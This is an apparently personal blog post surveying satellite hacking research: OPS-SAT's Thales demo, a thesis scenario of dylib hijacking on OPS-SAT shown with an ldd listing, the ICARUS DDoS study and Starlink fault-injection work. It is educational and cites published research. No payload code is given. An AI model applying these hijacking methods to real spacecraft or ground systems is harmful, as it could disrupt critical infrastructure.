---
title: Hacking Satellites & Everything In-Between
date: 2025-03-02 11:05:50
tags: 
    - Satellites
    - Hacking
    - Security
category:
    - Technology
permalink: /SAT/
---

<!-- THUMBNAIL -->


![](SAT/wallpaper.jpg)

<!-- more -->


<!-- 
⠄⠄⠄⠄⢠⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣯⢻⣿⣿⣿⣿⣆⠄⠄⠄
⠄⠄⣼⢀⣿⣿⣿⣿⣏⡏⠄⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣿⣿⣿⡆⠄⠄
⠄⠄⡟⣼⣿⣿⣿⣿⣿⠄⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⣿⣇⢻⣿⣿⣿⣿⠄⠄
⠄⢰⠃⣿⣿⠿⣿⣿⣿⠄⠄⠄⠄⠄⠄⠙⠿⣿⣿⣿⣿⣿⠄⢿⣿⣿⣿⡄⠄
⠄⢸⢠⣿⣿⣧⡙⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠈⠛⢿⣿⣿⡇⠸⣿⡿⣸⡇⠄
⠄⠈⡆⣿⣿⣿⣿⣦⡙⠳⠄⠄⠄⠄⠄⠄⢀⣠⣤⣀⣈⠙⠃⠄⠿⢇⣿⡇⠄
⠄⠄⡇⢿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⣠⣶⣿⣿⣿⣿⣿⣿⣷⣆⡀⣼⣿⡇⠄
⠄⠄⢹⡘⣿⣿⣿⢿⣷⡀⠄⢀⣴⣾⣟⠉⠉⠉⠉⣽⣿⣿⣿⣿⠇⢹⣿⠃⠄
⠄⠄⠄⢷⡘⢿⣿⣎⢻⣷⠰⣿⣿⣿⣿⣦⣀⣀⣴⣿⣿⣿⠟⢫⡾⢸⡟⠄.
⠄⠄⠄⠄⠻⣦⡙⠿⣧⠙⢷⠙⠻⠿⢿⡿⠿⠿⠛⠋⠉⠄⠂⠘⠁⠞⠄⠄⠄
⠄⠄⠄⠄⠄⠈⠙⠑⣠⣤⣴⡖⠄⠿⣋⣉⣉⡁⠄⢾⣦⠄⠄⠄⠄⠄⠄⠄⠄


Hi!
Hopefully you enjoyed this blog/article...
I spent a lot of time trying to customize it and make it look cooler!

- Seif Sebai <3


 -->




<style>

.yellow-text {
  color: #FFFF00;
}

.custom_style img{
    display: block;
    /* margin: 0 auto; */
    width: 30%;
}


iframe {
    display: block;
    margin: 0 auto;
    max-width: 80%;
    /* width: 80%; Adjust width as needed */
    /* height: 400px; Adjust height as needed */
}

/* img { */
    /* display: block; */
    /* margin: 0 auto; */
    /* width: 90%; */
    
    /* width: 80%; Adjust width as needed */
    /* height: 400px; Adjust height as needed */
/* } */

</style>

# Introduction



## Disclaimer & shout-out:
Most of the stuff I learned here is thanks to <b>Andrzej Olchawa</b>, <b>Lennert Wouters</b>, <b>François Quiquet</b>, <b>Angelina Tsuboi</b> and many other people who are way more skilled than me.

If you want to check out their blogs/presentations/courses please feel free to check the references [section [0]](#Section-0-Influence-People)
If you like to read papers & academic research about this subject go to [section [1]](#Section-1-Research-Papers) 
If you wish to contact me or know more about my work or background, check [section [2]](#Section-2-whoami)

And keep in mind that:

- This blog serves as the distilled version of the accumulated knowledge from great people. 

- This blog self-contained, meaning anything you might need to know is already here (unless explicitly said otherwise)

## Mission, Motivation and Aim:
I've always wanted to write down something that is just simple enough to be accessible via the general public but also serve as a reference pillar for experienced hackers and cyber security professionals.

So I decided to make this blog.

This blog is to try and share the word of the great works in satellite security and simplify it to a general audience whilst also serving as a great reference point for veterans.

Enjoy.










# Satellites, what are they?


![](SAT/sat.jpg)

## Simple definition:


>"A satellite or 'artificial satellite' is an object, typically a spacecraft, placed into orbit around a celestial body.(*)    
They have a variety of uses, including communication relay, weather forecasting, navigation (GPS), broadcasting, scientific research, and Earth observation. 
Additional military uses are reconnaissance, early warning, signals intelligence and, potentially, weapon delivery. Other satellites include the final rocket stages that place satellites in orbit and formerly useful satellites that later become defunct."
-- wiki (aka. just trust me?)

>(*) : in general u can call the moon a satellite although a natural and not an artificial one...  
and throughout the blog when I say 'satellites' I'm referring to 'artificial-satellites'... again, just lingo...


Notice how none of this mentions the word "secure"...

And really, when you dig deeper, the only difference between your smart-fridge and that billion-dollar satellite is that your smart fridge isn't orbiting something with the mass of 5.9722 x 10^24 kg....

Which brings us to this blog...
How vulnerable are satellites, and how can we exploit those vulnerabilities?

Spoiler Alert: Well, actually, they're quite vulnerable (since they rely on security by obscurity)... and that's quite astonishing considering a simple DoS attack can lead to disastrous results...
But we'll expand on that later....



## General structure of satellite systems:


First of all we need to learn and identify the different parts and terminologies related to satellites (mission control systems, ground stations etc..)

Now, we can more or less agree on the general structure of a satellite system..
and they can be roughly summed up in this visual:

![Alt Text](SAT/SAT.png)


(red 'lines' means your usual communication protocols like IPv4/6 and whatnot.. while yellow 'lines' means other protocols)


which is composed of:

### Space Segment (Satellite)


![Alt Text](SAT/SAT1.png)


This includes the satellite itself and its onboard systems:

- **Payload** – The primary mission equipment (e.g., communication transponders, cameras, scientific instruments).
- **Bus (Platform)** – The supporting structure and subsystems, including:
    - **Power System** – Solar panels and batteries to generate and store energy.
    - **Thermal Control System** – Regulates temperature in space.
    - **Attitude and Orbit Control System (AOCS)** – Maintains the satellite's orientation and orbit using thrusters and reaction wheels.
    - **Telemetry, Tracking, and Command (TT&C) System** – Enables communication with the ground station for control and data transmission.
    - **Propulsion System** – Adjusts the satellite's position and orbit.
etc...

If you're looking for a great video that explains *how to build a satellite* you can check The Efficient Engineer's video (just know that this video goes really in depth in everything satellite related, and we're merely interested in the security side of things which is roughly around 15:54 which covers the telemetry & communication part):
<!-- <center> -->

<iframe width="960" height="415" src="https://www.youtube.com/embed/5voQfQOTem8?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/5voQfQOTem8?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/5voQfQOTem8/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>

<!-- </center> -->

There's also Mark Rober's video for the very curious:

<!-- <center> -->
<iframe width="960" height="415" src="https://www.youtube.com/embed/6KcV1C1Ui5s?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/6KcV1C1Ui5s?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/6KcV1C1Ui5s/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>
<!-- </center> -->

---

Now, hacking the satellites themselves has a different approach than say hacking the other parts like ground or user segments...
They're like hacking embedded systems but think different protocols and whatnot...

And I'll try to cover different attack vectors and their impact shortly after detailing the aforementioned segments...

Note: If you wish to experiment with building satellites yourself, there is actually a cool site called [hack-a-sat Moonlighter](https://mission.hackasat.com/) that allows you to build a cubesat and experiment with it!

![Alt Text](SAT/moonlighter.jpg)

and if you wish to learn more about satellites and hack-a-sat in general you can do so at [hackasat.com/learn](https://hackasat.com/learn/)

### Ground Segment (Ground Stations)
![Alt Text](SAT/SAT2.png)
The infrastructure on Earth that communicates with the satellite:

- **Ground Control Station** – Monitors, controls, and manages the satellite’s functions.
- **Tracking and Telemetry Stations** – Receive and process signals from the satellite.
- **Mission Control Center** – Manages operations, data processing, and mission planning.

so think your usual enterprise and your usual devices... servers, routers etc...
Basically hacking this segment is akin to hacking any good-ol' company..

Just keep in mind that a lot of attack vectors and hacking incidents happen here...

### User Segment

![Alt Text](SAT/SAT3.png)

The end-users and devices that utilize satellite services:

- **Receivers (Antennas, Dishes, Terminals)** – Used by individuals, businesses, and governments to receive satellite data.
- **Mobile Devices and GPS Units** – Utilize satellite signals for navigation and communication.
- **Broadcast and Communication Networks** – Television, internet, and telecommunication services relying on satellite signals.

and these can range from your old civilian antennas and dishes to military ones...


---
<center>

![Alt Text](SAT/nier.gif)
("bunker" from Nier Automata)

</center>

Note:
It might sound bizarre to go after the user segment seeing you'd have to hack user dishes, routers and antennas... It's like saying "hack every person who has X app installed on their phone"..

But impact wise, It makes total sense since if you want to cut down communications (say for a rival opponent) you really don't care in which segment It happens and usually the user segment seems to be the easiest to tamper with... 

And since It happens to be the easiest segment to attack, It allows for the absolute shutdown of critical infrastructures, communication and GPS services etc...

Pair this with nation-sponsored hackers who have to do that for a living, you find that a lot of attacks happened in this segment simply because military bases go hand-in-hand with this kind of attack...


*tl;dr*: This is where most hacks actually happen, and I'll mention a few examples.


# ENOUGH TALK! -- LET'S START HACKING!

<center>

![](SAT/hack.gif)

</center>


Now hacking space satellites is quite sophisticated and is usually done by very experienced people (I know, shocker right?)...

But It's not rocket science... kinda?








Whilst researching this I found all kinds of crazy vulnerabilities and exploits documented by some brilliant researchers, some of which were only theoretical and thankfully the companies/agencies running those satellite systems were able to fix those issues.. whilst others were exploited in the wild!



Some of the hacks are not disclosed publicly (for one reason or the other)...
which makes collecting samples for this blog quite annoying...

But thankfully I was able to gather a few theoretical attacks (ones that were implemented by vendors themselves / researchers) and others practical and well documented like the Viasat attack...

<!-- 
<h1>A few interesting examples:</h1> -->

## Hacking OPS-SAT
<center>

![](SAT/endless_space.gif)
<div style="font-size:12px">Clip taken from Endless Space 2 (launching an observational probe)</div>

</center>

Now, I was hesitant on choosing which hack to cover first...

But then I decided to go with hacks around [OPS-SAT](https://en.wikipedia.org/wiki/OPS-SAT)... mainly because It's apparently the "First in-orbit research platform for space cybersecurity" and because It has a lot of public research and blogs about it...

There is also the fact that [Olafur Waage](#Olafur-Waage) was able to run DOOM on it making it the "First satellite to run DOOM in space"!!

anyways...


For those who don't want to [dive deep into OPS-SAT](https://www.eoportal.org/satellite-missions/ops-sat)
We can just summarize like this:

1. Satellites are computers in space.

AND

2. Servers are just computers.
And the cloud is just servers that you have access to.
so basically, the cloud is just computers.


Someone looked at the former thought of taking the "cloud" one step further...

and now we have

CLOUD IN [SPACE](https://www.youtube.com/watch?v=g1Sq1Nr58hM)!

or what is now called

"Sattelite-as-a-servivce (or SATAAS for short)"

<div style="margin-top:-39.1337%;max-width:70%;padding-left:35%;z-index:-1;position: relative;"> 
<!-- padding-bottom:20%; -->

![](SAT/ops-sat.png)

</div>


And It's useful...

In our case (OPS-SAT): It's for real-time data analysis of earth and earth's orbit...




---

Other relevant links for OPS-SAT:

[Automation of Operation and Testing for European Space Agency's OPS-SAT Mission - Felix Hessinger](https://ltu.diva-portal.org/smash/get/diva2:1358695/FULLTEXT01.pdf)

[Hacking the Stars: A Fuzzing Based Security Assessment of CubeSat Firmware - Florian Göhler](https://fgoehler.com/assets/pdf/Master_F_Goehler.pdf)

[Space Odyssey: An Experimental Software Security Analysis of Satellites - Johannes Willbold, Moritz Schloegel, Manuel Vogele, Maximilian Gerhardt,Thorsten Holz, Ali Abbasi](https://jwillbold.com/paper/willbold2023spaceodyssey.pdf)

### ESA & THALES (THALIUM)




[THALES (Group)](https://www.thalesgroup.com/en) along with [ESA (European Space Agency)](https://www.esa.int/) achieved the first (published) worldwide hacking demo of an in-orbit satellite!
(Hence why I decided to start with this attack vector)

Now, even though It took cooperation from both THALES and ESA (two big names in the industry by the way), It still took considerable effort to hack the satellite, which makes one wonder if a black box approach is even possible..


As far as I know, there's no published source code or firmware for me to analyze...
So "show me the code" doesn't work here and all I can do is speculate..
And honestly I don't think I can say anything that [François Quiquet](#Francois-Quiquet-Blogs-Articles) hasn't said already in his blogs:

[- Thales seizes control of ESA demonstration satellite in first cybersecurity exercise of its kind](https://www.spacesecurity.info/en/thales-seizes-control-of-esa-demonstration-satellite-in-first-cybersecurity-exercise-of-its-kind/)
[- Hacking demo at CYSAT 2023: world first or “déjà vu”](https://www.spacesecurity.info/en/hacking-demo-at-cysat-2023-world-first-or-deja-vu%e2%9d%93-here-is-what-i-know-%f0%9f%91%87/)
[- Thales demo at CYSAT: what was the point again](https://www.spacesecurity.info/en/thales-demo-at-cysat-what-was-the-point-again/)


But if you wish to dig deeper into the attack and the cooperation in general, they presented it at [CYSAT](https://cysat.eu/) which is one of the biggest european events tailored towards cybersecurity for satellites and the space industry in general:
<iframe width="960" height="415" src="https://www.youtube.com/embed/sXGQWLJ8904?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/sXGQWLJ8904?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/sXGQWLJ8904/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>


If you wish to read a blog that covers the attack chain in a more technical matter (although still limited to what we can gather from the slides) you can read [Hacking an On-Orbit Satellite: An Analysis of the CYSAT 2023 Demo by The Aerospace Corporation](https://medium.com/the-aerospace-corporation/hacking-an-on-orbit-satellite-an-analysis-of-the-cysat-2023-demo-ae241e5b8ee5)

But to summarize it in simple words, this attack vector by THALES assumes you have already hacked the ground station and was able to do a [java deserialization](https://portswigger.net/web-security/deserialization) attack...

Really, It's that *simple*... 
I mean, when you look back at it after crossing every failed attempt and trying every possible attack vector and navigating every possible path It looks a bit simple... But It is nothing short of a technical achievement only possible through high levels of dedication.

<!-- TODO: CREATE PART -->

### THE DESTRUCTION OF THE LOW EARTH ORBIT SATELLITES' SYSTEM

<center>

![](SAT/stellaris.gif)
<div style="font-size:12px">Clip taken from Stellaris</div>

</center>

Well, the title and .gif image taken from Stellaris might be a bit exaggerated...
But there is actually a high chance of a malicious actor (hypothetically) doing this...

You can check this [Master's Thesis by Matteo Calabrese called "Space Oddity: Space Cybersecurity Lessons from a Simulated OPS-SAT Attack"](https://ntnuopen.ntnu.no/ntnu-xmlui/bitstream/handle/11250/3101999/no.ntnu%3Ainspera%3A146715749%3A128271317.pdf) which roughly covers the general structure of this attack...

And if you want a video explaining this attack vector you can watch [Matteo Calabrese](#Matteo-Calabrese)'s demo about it (presented at CYSAT 2023):

<iframe width="960" height="415" src="https://www.youtube.com/embed/CSDz_fctrHg?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/CSDz_fctrHg?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/CSDz_fctrHg/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>



I will get just a tiny bit technical here since mentioning the thesis paper is boring without having code alongside it...

But the gist of it is simple:
>Exploit a [dylib (dynamic library) hijacking(*)](https://attack.mitre.org/techniques/T1574/004/) attack on valid software; to inject malicious code and allow the attacker to sabotage the mission and effectively spoof the satellite's payload.

(*): if you wish to learn more about dylib hijacking you can check this presentation by [Patrick Wardle - DEF CON 23 - DLL Hijacking on OS X](https://www.youtube.com/watch?v=PGVNja2MNws) ([mirror on TIB AV-Portal](https://av.tib.eu/media/36418))


which is really simple once you ignore the whole hacking jargon...
The conditions are:
1. You have code/software/application (whatever you wanna call it), that references (uses/calls etc..) another part of code conventionally named linked libraries (in windows they're called DLLs, in linux they're those ___.so files etc...)
2. You have access (writing access) to that linked library.

BOOM
Now when you modify the linked library (or replace it really) you also modify the original code's behavior.
quite simple <3

And how would we do that here?

The thesis mention one interesting scenario:
First we check for interesting applications that are hosted on OPS-SAT (OPS-SAT allows user code upload by design)
A cool one being [Georges Labrèche](#Georges-Labreche)'s project, the [opssat-smartcam](https://github.com/georgeslabreche/opssat-smartcam) (the first use of deep convolutional neural networks (CNN) on-board a spacecraft) which makes a syscall to an interesting binary called `"ims100_testapp"` that does the image acquisition for the CNN..

You can check the exact [function that does this call at line 899 and 910](https://github.com/georgeslabreche/opssat-smartcam/blob/main/home/exp1000/smartcam.py#L899)

``` py
class HDCamera:
    # [_func_line_895]
    def acquire_image(self):
        """Acquire an image with the on-board camera."""
        # line 899: Build the image acquisition execution command string.
        cmd_image_acquisition = 'ims100_testapp -R {R} -G {G} -B {B} -c /dev/cam_tty -m /dev/cam_sd -v 0 -n 1 -p -e {E} >> {L} 2>&1'.format(\
            R=self.gains[0],G=self.gains[1],B=self.gains[2],E=self.exposure,L=LOG_FILE)

        # Log the command that will be executed.
        logger.info("Running command to acquire an image: {C}".format(C=cmd_image_acquisition))

        # Run the image acquisition command. (line 910)
        os.system(cmd_image_acquisition)

        # more code [...]
```

Well, first we check for linked libraries with [ldd](https://man7.org/linux/man-pages/man1/ldd.1.html):

(The results are taken from the mentioned thesis)
``` bash
root@e7bf7d419488:/ ldd /sepp/usr/bin/ims100_testapp #<--------- app in question

    libims100_api.so => /sepp/usr/lib/libims100_api.so (0x3f057000) #<--------- This one is interesting
    libgcc_s.so.1 => /lib/arm-linux-gnueabihf/libgcc_s.so.1 (0x3f02e000) #<--------+----- generic libs
    libc.so.6 => /lib/arm-linux-gnueabihf/libc.so.6 (0x3ef36000)        #<---------|
                /lib/ld-linux-armhf.so.3 (0x40000000)      #<--------------------/
```


Then we use a tool called [fakelib.sh by Eduardo Blázquez](https://github.com/eblazquez/fakelib.sh) and assign the appropriate gcc compiler for this architecture to create the malicious linked library...

At this point the attack is clear...
And can be roughly summarized in this image:

![](SAT/dylib.jpg)

All is left is persistence and lateral movement (aka. taking FULL CONTROL of the system)
I'll skip the tedious details of the simulation itself and you can check the thesis if you want more details but just know that without actual open source distribution of OPS-SAT's Satellite Experimental Processing Platform (SEPP)... A lot of the stuff here is either theoretical or missing...
The best I can do here is try and replicate a dual twin of what I "think" is OPS-SAT's actual software from what I can gather online...
So I'll just take the author's opinion here:

>[...] Malicious activities like exploit execution and lateral movement might not be actively detected, unless they produce noticeable side effects. If a more sophisticated attack, involving exploits for both the payload and the bus system, were to be developed, it would be interesting to assess whether the spacecraft’s recoverability could be undermined and entirely compromised. [4.3. DEVELOPING THE ATTACK P51]

and

>In a realistic scenario, the attacker could penetrate the OBC and take control by modifying cryptographic material or isolating communication interfaces, effectively locking out the ground segment. This would place the entire satellite under the attacker’s control, enabling various other scenarios included in the SPARTA matrix, such as destruction, denial, disruption, and degradation. [4.4. VISUALISING THE ATTACK P53]

---

which, with vivid imagination, one can imagine the following scenario:


<center style="font-size:24px;">

𝐖𝐡𝐚𝐭 𝐢𝐟 𝐭𝐡𝐞 𝐛𝐢𝐧𝐚𝐫𝐲 𝐢𝐧 𝐪𝐮𝐞𝐬𝐭𝐢𝐨𝐧 𝐰𝐚𝐬𝐧'𝐭 𝐭𝐡𝐚𝐭 𝐨𝐟 𝐭𝐡𝐞 𝐜𝐚𝐦𝐞𝐫𝐚 𝐛𝐮𝐭 𝐢𝐧𝐬𝐭𝐞𝐚𝐝 𝐭𝐡𝐞 𝐨𝐧𝐞 c𝐨𝐧𝐭𝐫𝐨𝐥𝐥𝐢𝐧𝐠 𝐭𝐡𝐞 𝐬𝐚𝐭𝐞𝐥𝐥𝐢𝐭𝐞'𝐬 𝐩𝐨𝐬𝐢𝐭𝐢𝐨𝐧?

</center>

or as said in the thesis:
>One alarming possibility is that an attacker gains advanced capabilities, like compromising the bus system, using it to take over the entire satellite. In such a scenario, the satellite could be directed towards other spacecrafts, transforming it into an anti-satellite weapon. [5.1. DISCUSSION 59]

Oh...


<center>

![](SAT/gravity.gif)
(taken from [Gravity](https://www.imdb.com/title/tt1454468/) 2013)

</center>

[Disasterous results](https://medium.com/predict/the-kessler-syndrome-closing-off-earth-from-space-8126bd13bebb) will happen...
Disasterous results indeed...


Here, we're interested in the GNC:
>GNC (Guidance, Navigation and Control System): The system responsible for guiding and controlling the spacecraft’s movements, maintaining its orientation, and ensuring accurate positioning (e.g, in orbit). [2. BACKGROUND P6]

Taking control of it and [aiming it towards other satellites and spacecrafts](https://www.esa.int/Enabling_Support/Preparing_for_the_Future/Discovery_and_Preparation/Space_smash_simulating_when_satellites_collide) would create what's known as the [Kessler effect](https://en.wikipedia.org/wiki/Kessler_syndrome) where you'd have a domino effect of satellites destroying eachother and rendering the whole LEO system useless (don't worry, [MEO](https://en.wikipedia.org/wiki/Medium_Earth_orbit) and [GEO](https://en.wikipedia.org/wiki/Geostationary_orbit) are *probably* safe)

And I love this quote from the wiki page on the Kessler effect:
>Any intelligent civilization which becomes spacefaring could eventually extinguish any safe orbits via Kessler syndrome, trapping itself within its home planet.[29] Such a result could happen even with robust space pollution controls, as `a lone malicious actor on a planet could cause a Kessler syndrome scenario`.[30] Humanity could be on the path to a similar fate, soon to trap itself on Earth with no future as a spacefaring civilization.[31]


<center >
<div style="min-width:102%">


![](SAT/debris.gif)![](SAT/Space-Debris-Danger.gif)

<!-- </div> -->

</center>

(relevant sources):

>[29]: Forgan, Duncan H. (2019). Solving Fermi's Paradox. Cambridge Astrobiology. Cambridge University Press. doi:10.1017/9781316681510. ISBN 978-1-316-68151-0. OCLC 1098275130. OL 21201773W.
>[30]: Hamilton, Chase (2022). "Space and existential risk: The need for global coordination and caution in space development". Duke Law & Technology Review. 21: 1–60.
>[31]: Kessler, Donald (1971). "Estimate of Particle Densities and Collision Danger for Spacecraft Moving Through the Asteroid Belt". Physical Studies of Minor Planets. 267. NASA SP-267: 595–605. Bibcode:1971NASSP.267..595K.

>[Swirling Fragments of Past Space Endeavors: Threatening Our Future in Space](https://scitechdaily.com/swirling-fragments-of-past-space-endeavors-threatening-our-future-in-space/)




## ICARUS Simulation (2021)

This part covers the theoretical attack which was simulated and studied thoroughly
by the authors of the paper *ICARUS: Attacking low Earth orbit satellite networks*: 
Giacomo Giuliari, Tommaso Ciussani, Adrian Perrig, and Ankit Singla, ETH Zurich.

which you can check [here](https://www.usenix.org/system/files/atc21-giuliari.pdf)

Now, I actually found out about ICARUS from another paper called ["SoK: Evaluating the Security of Satellite Systems"](https://arxiv.org/pdf/2312.01330) which goes more in depth about possible attack vectors and different attacks on different segments, so check it out.

And the ICARUS attack is quite "simple" security wise:

>It's a DDoS attack on LEO (Low Earth Orbit) satellites, and in their terms "exploiting their decentralized structures to flood targets with excessive traffic and cause service disruptions."


So in cybersecurity terms, even a skid can do this...
It's so simple in fact you can pretty much sammarize it in this image:

![Icarus](SAT/Icarus.jpg)

And this mainly relies on the fact that a satellite's position has to be known by everyone at all times... which is really the main challenge facing say, internet satellites, like starlink...

There's also the fact that this targets the satellite segment...
(It's always fun when you have those :^) )

So the issue here can't just simply "fixed" with a firmware update on the fly... It has to be taken in consideration pre-launch when designing the satellites' network...

And It's not an avoidable risk either because not doing so would just result in the non-availability of your service and pretty much wasting thousands if not millions of dollars on satellites that can only be considered by then nothing but a useless pile of expensive trash orbiting earth...

So let's hope these theoretical studies are well researched and analyzed before launching anything into orbit.

---
You can watch the authors' video on it:

<iframe width="960" height="415" src="https://www.youtube.com/embed/H0v8p68BCtk?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/H0v8p68BCtk?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/H0v8p68BCtk/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>

The paper can also be found [here](https://netsec.ethz.ch/publications/papers/atc21-final594.pdf)
and there's a github repo for those who want to reproduce the simulation:
[Github Link](https://github.com/giacgiuliari/icarus-framework)

And really that's pretty much it... dunno how much I more I can add to a DDoS attack...
I guess the name is cool? ICARUS... And knowing how geeky hackers get, It's likely a Deus Ex reference <3













## Hacking Starlink with 25$ and a cup of coffee



<!-- TODO: CREATE PART -->




Actually the cup of coffee is optional...


There is a lot to Starlink: routers, user terminals, ground stations and space stations etc...
And if you're interested more on how this whole Starlink Internet works you can watch this video
Although It's VERY optional...

<iframe width="960" height="415" src="https://www.youtube.com/embed/qs2QcycggWU?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/qs2QcycggWU?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/qs2QcycggWU/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>

And there's a lot of parts here that interconnect and a lot of researchers who have independently researched Starlink and contributed to making it more secure.

One of the most interesting hackers I found was [MikeOnSpace](https://www.youtube.com/@MikeOnSpace) (couldn't find any twitter(X)/bluesky socials so thought I'd mention his YT channel...) in his [playlist](https://www.youtube.com/playlist?list=PLzgGbIZxMAx9vGa22dx5zi9qAB3DkoNuM) where he goes in depth into tearing down Starlink's satellite dishes and reversing their firmware (there's also this [unlisted video](https://www.youtube.com/watch?v=iOmdQnIlnRo) by Ken Keiter where he explains the different parts that make the dishes and elaborates on the design choices)...

There is also research by [COSIC: Dumping and extracting the SpaceX Starlink User Terminal firmware](https://www.esat.kuleuven.be/cosic/blog/dumping-and-extracting-the-spacex-starlink-user-terminal-firmware/) and here you'd find various firmware dumps and how to get root access to user terminals by unfusing them.

Interestingly, there is research by [Quarkslab: Diving into Starlink's User Terminal Firmware](https://blog.quarkslab.com/starlink.html)
and they even published a few tools you can use to reverse the firmware on [Github (quarkslab/starlink-tools)](https://github.com/quarkslab/starlink-tools)

(Both of these firmware dumps have been discussed on Hacker News by the way: [link_1(COSIC)](https://news.ycombinator.com/item?id=27751759) [link_2(Quarkslab)](https://news.ycombinator.com/item?id=37308405))

And some have even gone ahead and reversed each starlink router starting from gen_1 like [Oleg Kutkov](#Oleg-Kutkov):
[Analysis and reverse-engineering of the original Starlink router](https://olegkutkov.me/2021/12/25/analysis-and-reverse-engineering-of-the-original-starlink-router/)
[Initial analysis of the Starlink router gen2](https://olegkutkov.me/2022/04/10/initial-analysis-of-the-starlink-router-gen2/)
[Starlink rev 3 (V2) power architecture](https://olegkutkov.me/2024/12/31/starlink-rev-3-v2-power-architecture/)



But, the most interesting research by far (and the main hack in this part) is done by [Lennert Wouters](#Lennert-Wouters).

It can be roughly summarized in this 1 minute video by [Low Level](https://www.youtube.com/@LowLevelTV):

<iframe width="960" height="415" src="https://www.youtube.com/embed/V2ndAlB9kpE?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/V2ndAlB9kpE?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/V2ndAlB9kpE/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
          <span>▶</span>
        </a>
      " frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" title="YouTube Video"></iframe>

and for the technical people out there:
>The hack consists of exploiting a voltage fault injection to cause the firmware signature verification to fail leading to a root terminal.

Anyone non-technical reading that would think It's just a quote taken from a sci-fi movie...

But for my tech-savvy hackers out there, you can watch [the legend](#Lennert-Wouters)'s presentation about it from DEF CON / Blackhat (he presented at both and they're not so different from eachother):
<iframe width="960" height="415" src="https://www.youtube.com/embed/myKs04lfuy8?autoplay=1" srcdoc="
        <style>
          * { padding: 0; margin: 0; overflow: hidden; }
          html, body { height: 100%; }
          img, span { position: absolute; width: 100%; top: 0; bottom: 0; margin: auto; }
          span { height: 1.5em; text-align: center; font: 48px/1.5 sans-serif; color: white; text-shadow: 0 0 0.5em black; }
        </style>
        <a href=&quot;https://www.youtube.com/embed/myKs04lfuy8?autoplay=1&quot;>
          <img src=&quot;https://img.youtube.com/vi/myKs04lfuy8/hqdefault.jpg&quot; alt=&quot;YouTube Video&quot;>
